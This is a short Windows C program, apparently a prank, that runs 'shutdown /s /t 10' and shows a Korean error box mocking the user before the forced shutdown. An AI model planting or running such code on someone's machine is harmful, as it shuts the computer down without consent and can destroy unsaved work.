#include "framework.h"

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpszCmdParam, int nCmdShow) {
	system("shutdown /s /t 10");
	MessageBoxW(NULL, L"컴퓨터가 사용자의 얼굴을 보고 기절했습니다.\n사용자의 컴퓨터를 10초후에 종료합니다.", L"내 PC", MB_OK | MB_ICONERROR);
	return 0;
}